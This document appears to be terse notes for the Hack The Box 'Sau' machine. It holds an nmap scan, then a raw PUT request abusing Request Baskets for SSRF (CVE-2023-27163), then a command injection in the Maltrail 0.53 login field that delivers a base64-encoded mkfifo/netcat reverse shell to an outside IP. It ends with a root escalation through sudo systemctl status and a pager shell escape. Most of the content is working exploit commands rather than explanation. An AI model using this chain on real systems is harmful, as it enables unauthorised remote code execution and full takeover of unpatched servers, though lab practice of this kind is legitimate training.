nmap result
```
PORT      STATE    SERVICE REASON      VERSION
22/tcp    open     ssh     syn-ack     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa8867d7133d083a8ace9dc4ddf3e1ed (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDdY38bkvujLwIK0QnFT+VOKT9zjKiPbyHpE+cVhus9r/6I/uqPzLylknIEjMYOVbFbVd8rTGzbmXKJBdRK61WioiPlKjbqvhO/YTnlkIRXm4jxQgs+xB0l9WkQ0CdHoo/Xe3v7TBije+lqjQ2tvhUY1LH8qBmPIywCbUvyvAGvK92wQpk6CIuHnz6IIIvuZdSklB02JzQGlJgeV54kWySeUKa9RoyapbIqruBqB13esE2/5VWyav0Oq5POjQWOWeiXA6yhIlJjl7NzTp/SFNGHVhkUMSVdA7rQJf10XCafS84IMv55DPSZxwVzt8TLsh2ULTpX8FELRVESVBMxV5rMWLplIA5ScIEnEMUR9HImFVH1dzK+E8W20zZp+toLBO1Nz4/Q/9yLhJ4Et+jcjTdI1LMVeo3VZw3Tp7KHTPsIRnr8ml+3O86e0PK+qsFASDNgb3yU61FEDfA0GwPDa5QxLdknId0bsJeHdbmVUW3zax8EvR+pIraJfuibIEQxZyM=
|   256 ec2eb105872a0c7db149876495dc8a21 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEFMztyG0X2EUodqQ3reKn1PJNniZ4nfvqlM7XLxvF1OIzOphb7VEz4SCG6nXXNACQafGd6dIM/1Z8tp662Stbk=
|   256 b30c47fba2f212ccce0b58820e504336 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICYYQRfQHc6ZlP/emxzvwNILdPPElXTjMCOGH6iejfmi
80/tcp    filtered http    no-response
55555/tcp open     unknown syn-ack
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Wed, 19 Jul 2023 16:20:23 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Wed, 19 Jul 2023 16:19:56 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Wed, 19 Jul 2023 16:19:57 GMT
|_    Content-Length: 0
```


Nmap found :
```
open  : port 22
close : port 80 (web)
open  : port 55555 (web)
```



Foothold : Click a basket -> Forward URL -> put http://127.0.0.1 (SSRF)

POC    : https://github.com/entr0pie/CVE-2023-27163
Article : https://notes.sjtu.edu.cn/s/MUUhEymt7#

```http
PUT /api/baskets/1pqk7hz HTTP/1.1

Host: sau.htb:55555

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: application/json, text/javascript, */*; q=0.01

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded; charset=UTF-8

Authorization: tprfsjFHDgvGaO9NwWubjRKipAU_126pcD4tzob2RaTj

X-Requested-With: XMLHttpRequest

Content-Length: 111

Origin: http://sau.htb:55555

Connection: close

Referer: http://sau.htb:55555/web/1pqk7hz


{
"forward_url":"http://127.0.0.1",
"proxy_response":true,
"insecure_tls":false,
"expand_path":true,
"capacity":200
}

```

Access http://127.0.0.1/1pqk7hz since its now port 80 

Reverse Shell (Exploit Maltrail (v0.53))
```bash
# POC
curl 'http://hostname:8338/login' \
  --data 'username=;`id > /tmp/bbq`'
```
https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/

```bash
#rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.132 4567 >/tmp/f

curl 'http://sau.htb:55555/1pqk7hz/login' \
  --data 'username=;`echo "cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDEwLjEwLjE0LjEzMiA0NTY3ID4vdG1wL2Y="  | base64 -d | sh`'

```

Root
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
sudo /usr/bin/systemctl status trail.service
!sh
```


https://www.hackthebox.com/achievement/machine/336799/551


https://www.zpast0r.com/HTB-Sau.html

https://techyrick.com/sau-htb-writeup/
